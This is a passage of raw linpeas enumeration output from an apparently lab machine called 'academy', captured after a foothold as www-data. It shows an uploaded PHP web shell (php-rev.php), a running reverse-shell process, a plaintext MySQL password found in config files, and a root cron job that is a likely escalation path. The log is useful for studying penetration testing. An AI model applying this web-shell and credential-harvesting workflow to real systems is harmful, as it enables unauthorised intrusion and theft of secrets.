ig/e9/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php/var/lib/phpmyadmin/tmp/twig/f5/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php/var/lib/phpmyadmin/tmp/twig/fa/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php/var/tmp/var/www/html/academy/var/www/html/academy/admin/var/www/html/academy/admin/assets/var/www/html/academy/admin/assets/css/var/www/html/academy/admin/assets/css/bootstrap.css/var/www/html/academy/admin/assets/css/font-awesome.css/var/www/html/academy/admin/assets/css/style.css/var/www/html/academy/admin/assets/fonts/var/www/html/academy/admin/assets/fonts/FontAwesome.otf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/admin/assets/img/var/www/html/academy/admin/assets/js/var/www/html/academy/admin/assets/js/bootstrap.js/var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/check_availability.php/var/www/html/academy/admin/course.php/var/www/html/academy/admin/department.php/var/www/html/academy/admin/edit-course.php/var/www/html/academy/admin/enroll-history.php/var/www/html/academy/admin/includes/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/includes/footer.php/var/www/html/academy/admin/includes/header.php/var/www/html/academy/admin/includes/menubar.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/level.php/var/www/html/academy/admin/logout.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/print.php/var/www/html/academy/admin/semester.php/var/www/html/academy/admin/session.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/admin/user-log.php/var/www/html/academy/assets/var/www/html/academy/assets/css/var/www/html/academy/assets/css/bootstrap.css/var/www/html/academy/assets/css/font-awesome.css/var/www/html/academy/assets/css/style.css/var/www/html/academy/assets/fonts/var/www/html/academy/assets/fonts/FontAwesome.otf/var/www/html/academy/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/assets/img/var/www/html/academy/assets/js/var/www/html/academy/assets/js/bootstrap.js/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/check_availability.php/var/www/html/academy/db/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/enroll-history.php/var/www/html/academy/enroll.php/var/www/html/academy/includes/var/www/html/academy/includes/config.php/var/www/html/academy/includes/footer.php/var/www/html/academy/includes/header.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/logout.php/var/www/html/academy/my-profile.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/print.php/var/www/html/academy/studentphoto/var/www/html/academy/studentphoto/php-rev.php/tmp/linpeas.sh/dev/mqueue/linpeas.txt[+] Searching passwords in config PHP files$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        $mysql_password = "My_V3ryS3cur3_P4ss";[+] Finding IPs inside logs (limit 100)     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                                 24 /var/log/dpkg.log.1:1.8.2.3     14 /var/log/dpkg.log.1:1.8.4.3      9 /var/log/wtmp:192.168.10.31      7 /var/log/dpkg.log.1:7.43.0.2      7 /var/log/dpkg.log.1:4.8.6.1      7 /var/log/dpkg.log.1:1.7.3.2      7 /var/log/dpkg.log.1:0.5.10.2      7 /var/log/dpkg.log.1:0.19.8.1      4 /var/log/installer/status:1.2.3.3      1 /var/log/lastlog:192.168.10.31[+] Finding passwords inside logs (limit 100)/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                /var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1/var/log/installer/status:Description: Set up users and passwords[+] Finding emails inside logs (limit 100)      1 /var/log/installer/status:aeb@debian.org                                                                                                                     1 /var/log/installer/status:anibal@debian.org      2 /var/log/installer/status:berni@debian.org     40 /var/log/installer/status:debian-boot@lists.debian.org     16 /var/log/installer/status:debian-kernel@lists.debian.org      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org      1 /var/log/installer/status:debian@jff.email      1 /var/log/installer/status:djpig@debian.org      4 /var/log/installer/status:gcs@debian.org      2 /var/log/installer/status:guillem@debian.org      1 /var/log/installer/status:guus@debian.org      1 /var/log/installer/status:linux-xfs@vger.kernel.org      2 /var/log/installer/status:mmind@debian.org      1 /var/log/installer/status:open-iscsi@packages.debian.org      1 /var/log/installer/status:open-isns@packages.debian.org      1 /var/log/installer/status:packages@release.debian.org      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net      1 /var/log/installer/status:petere@debian.org      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org      1 /var/log/installer/status:rogershimizu@gmail.com      2 /var/log/installer/status:team+lvm@tracker.debian.org      1 /var/log/installer/status:tytso@mit.edu      1 /var/log/installer/status:wpa@packages.debian.org      1 /var/log/installer/status:xnox@debian.org[+] Finding *password* or *credential* files in home                                                                                                                                                               [+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             /var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/includes/config.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'./etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries/etc/debconf.conf:Accept-Type: password/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat/etc/debconf.conf:Name: passwords/etc/debconf.conf:Reject-Type: password/etc/debconf.conf:Stack: config, passwordsLinux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEYEND:                                                                                                                                                         RED/YELLOW: 99% a PE vector  RED: You must take a look at it  LightCyan: Users with console  Blue: Users without console & mounted devs  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)   LightMangenta: Your username====================================( Basic information )=====================================OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)Hostname: academyWritable folder: /dev/shm[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                                                                                                                                                                                   ====================================( System Information )====================================[+] Operative system                                                                                                                                           [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      Distributor ID: DebianDescription:    Debian GNU/Linux 10 (buster)Release:        10Codename:       buster[+] Sudo versionsudo Not Found                                                                                                                                                                                                                                                                                                                [+] PATH[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin[+] DateSat Jul 29 06:37:17 EDT 2023                                                                                                                                   [+] System statsFilesystem      Size  Used Avail Use% Mounted on                                                                                                               /dev/sda1       6.9G  1.9G  4.7G  29% /udev            479M     0  479M   0% /devtmpfs           494M     0  494M   0% /dev/shmtmpfs            99M  4.3M   95M   5% /runtmpfs           5.0M     0  5.0M   0% /run/locktmpfs           494M     0  494M   0% /sys/fs/cgrouptmpfs            99M     0   99M   0% /run/user/0              total        used        free      shared  buff/cache   availableMem:        1009960      178916      474532       10816      356512      640884Swap:        998396           0      998396[+] Environment[i] Any private information inside environment variables?                                                                                                      HISTFILESIZE=0                                                                                                                                                 APACHE_RUN_DIR=/var/run/apache2APACHE_PID_FILE=/var/run/apache2/apache2.pidJOURNAL_STREAM=9:13967PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9APACHE_LOCK_DIR=/var/lock/apache2LANG=CHISTSIZE=0APACHE_RUN_USER=www-dataAPACHE_RUN_GROUP=www-dataAPACHE_LOG_DIR=/var/log/apache2HISTFILE=/dev/null[+] Looking for Signature verification failed in dmseg Not Found                                                                                                                                                                                                                                                                                                                    [+] selinux enabled? .......... sestatus Not Found[+] Printer? .......... lpstat Not Found                                                                                                                       [+] Is this a container? .......... No                                                                                                                         [+] Is ASLR enabled? .......... Yes                                                                                                                            =========================================( Devices )==========================================[+] Any sd* disk in /dev? (limit 20)                                                                                                                           sda                                                                                                                                                            sda1sda2sda5[+] Unmounted file-system?[i] Check if you can mount umounted devices                                                                                                                    UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0====================================( Available Software )====================================[+] Useful software?                                                                                                                                           /usr/bin/nc                                                                                                                                                    /usr/bin/netcat/usr/bin/nc.traditional/usr/bin/wget/usr/bin/ping/usr/bin/base64/usr/bin/socat/usr/bin/python/usr/bin/python2/usr/bin/python3/usr/bin/python2.7/usr/bin/python3.7/usr/bin/perl/usr/bin/php[+] Installed compilers?Compilers Not Found                                                                                                                                                                                                                                                                                                           ================================( Processes, Cron & Services )================================[+] Cleaned processes                                                                                                                                          [i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/initroot       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journaldroot       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevdsystemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncdroot       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -froot       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logindmessage+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlyroot       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONEroot       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.confroot       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -Droot       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k startmysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqldwww-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k startroot       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --userroot       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bashroot       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclientroot      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclientwww-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -iwww-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -iwww-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.shwww-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux[+] Binary processes permissions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                       56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                          0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd[+] Cron jobs[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 -rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          /etc/cron.d:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rw-r--r--  1 root root  712 Dec 17  2018 php/etc/cron.daily:total 40drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd/etc/cron.hourly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.monthly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.weekly:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  813 Feb 10  2019 man-dbSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin* * * * * /home/grimmie/backup.sh[+] Services[i] Search for outdated versions                                                                                                                                [ - ]  apache-htcacheclean                                                                                                                                     [ + ]  apache2 [ + ]  apparmor [ - ]  console-setup.sh [ + ]  cron [ + ]  dbus [ - ]  hwclock.sh [ - ]  keyboard-setup.sh [ + ]  kmod [ + ]  mysql [ + ]  networking [ + ]  procps [ - ]  rsync [ + ]  rsyslog [ + ]  ssh [ + ]  udev [ + ]  vsftpd===================================( Network Information )====================================[+] Hostname, hosts and DNS                                                                                                                                    academy                                                                                                                                                        127.0.0.1       localhost127.0.1.1       academy.tcm.sec academy::1     localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersdomain localdomainsearch localdomainnameserver 172.16.2.2tcm.sec[+] Content of /etc/inetd.conf/etc/inetd.conf Not Found                                                                                                                                                                                                                                                                                                     [+] Networks and neighboursdefault         0.0.0.0                                                                                                                                        loopback        127.0.0.0link-local      169.254.0.01: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33       valid_lft 1638sec preferred_lft 1638sec    inet6 fe80::20c:29ff:fea6:6e61/64 scope link        valid_lft forever preferred_lft forever172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE[+] Iptables rulesiptables rules Not Found                                                                                                                                                                                                                                                                                                      [+] Active Ports[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                                                                                                                                                                                           [+] Can I sniff with tcpdump?No                                                                                                                                                                                                                                                                                                                            ====================================( Users Information )=====================================[+] My user                                                                                                                                                    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          [+] Do I have PGP keys?gpg Not Found                                                                                                                                                                                                                                                                                                                 [+] Clipboard or highlighted text?xsel and xclip Not Found                                                                                                                                                                                                                                                                                                      [+] Testing 'sudo -l' without password & /etc/sudoers[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                                                                                                                                          [+] Checking /etc/doas.conf/etc/doas.conf Not Found                                                                                                                                                                                                                                                                                                      [+] Checking Pkexec policy                                                                                                                                                               [+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                                                                                                                                                                             [+] Superusersroot:x:0:0:root:/root:/bin/bash                                                                                                                                [+] Users with consolegrimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   root:x:0:0:root:/root:/bin/bash[+] Login information 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty1     -                10:18   29:42   0.04s  0.01s -bashroot     tty1                          Sat May 29 13:31 - down   (00:12)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)root     tty1                          Sat May 29 13:16 - down   (00:11)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)administ tty1                          Sat May 29 13:06 - down   (00:08)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)wtmp begins Sat May 29 13:05:58 2021[+] All users_apt                                                                                                                                                           backupbindaemonftpgamesgnatsgrimmieirclistlpmailmanmessagebusmysqlnewsnobodyproxyrootsshdsyncsyssystemd-coredumpsystemd-networksystemd-resolvesystemd-timesyncuucpwww-data[+] Password policyPASS_MAX_DAYS   99999                                                                                                                                          PASS_MIN_DAYS   0PASS_WARN_AGE   7ENCRYPT_METHOD SHA512===================================( Software Information )===================================[+] MySQL version                                                                                                                                              mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      [+] MySQL connection using default root/root ........... No[+] MySQL connection using root/toor ................... No                                                                                                    [+] MySQL connection using root/NOPASS ................. No                                                                                                    [+] Looking for mysql credentials and exec                                                                                                                     From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     Found readable /etc/mysql/my.cnf[client-server]!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/[+] PostgreSQL version and pgadmin credentials Not Found                                                                                                                                                                                                                                                                                                                    [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                                                                                                                                                                                      [+] Apache server infoVersion: Server version: Apache/2.4.38 (Debian)                                                                                                                Server built:   2020-08-25T20:08:29[+] Looking for PHPCookies Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Wordpress wp-config.php fileswp-config.php Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for Tomcat users filetomcat-users.xml Not Found                                                                                                                                                                                                                                                                                                    [+] Mongo information Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for supervisord configuration filesupervisord.conf Not Found                                                                                                                                                                                                                                                                                                    [+] Looking for cesi configuration filecesi.conf Not Found                                                                                                                                                                                                                                                                                                           [+] Looking for Rsyncd config file/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      [ftp]        comment = public archive        path = /var/www/pub        use chroot = yes        lock file = /var/lock/rsyncd        read only = yes        list = yes        uid = nobody        gid = nogroup        strict modes = yes        ignore errors = no        ignore nonreadable = yes        transfer logging = no        timeout = 600        refuse options = checksum dry-run        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz[+] Looking for Hostapd config filehostapd.conf Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for wifi conns file Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Anaconda-ks config filesanaconda-ks.cfg Not Found                                                                                                                                                                                                                                                                                                     [+] Looking for .vnc directories and their passwd files.vnc Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for ldap directories and their hashes/etc/ldap                                                                                                                                                      The password hash is from the {SSHA} to 'structural'[+] Looking for .ovpn files and credentials.ovpn Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for ssl/ssh filesPermitRootLogin yes                                                                                                                                            ChallengeResponseAuthentication noUsePAM yesLooking inside /etc/ssh/ssh_config for interesting infoHost *    SendEnv LANG LC_*    HashKnownHosts yes    GSSAPIAuthentication yes[+] Looking for unexpected auth lines in /etc/pam.d/sshdNo                                                                                                                                                                                                                                                                                                                            [+] Looking for Cloud credentials (AWS, Azure, GC)                                                                                                                                                               [+] NFS exports?[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         /etc/exports Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for kerberos conf files and tickets[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          krb5.conf Not Found                                                                                                                                            tickets kerberos Not Found                                                                                                                                     klist Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for Kibana yamlkibana.yml Not Found                                                                                                                                                                                                                                                                                                          [+] Looking for logstash files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for elasticsearch files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Vault-ssh filesvault-ssh-helper.hcl Not Found                                                                                                                                                                                                                                                                                                [+] Looking for AD cached hahsescached hashes Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for screen sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            screen Not Found                                                                                                                                                                                                                                                                                                              [+] Looking for tmux sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            tmux Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for Couchdb directory                                                                                                                                                               [+] Looking for redis.conf                                                                                                                                                               [+] Looking for dovecot filesdovecot credentials Not Found                                                                                                                                                                                                                                                                                                 [+] Looking for mosquitto.conf                                                                                                                                                               ====================================( Interesting Files )=====================================[+] SUID                                                                                                                                                       [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    /usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/bin/chfn           --->    SuSE_9.3/10/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8/usr/bin/newgrp         --->    HP-UX_10.20/usr/bin/umount         --->    BSD/Linux[1996-08-13]/usr/bin/chsh/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM/usr/bin/su/usr/bin/gpasswd[+] SGID[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           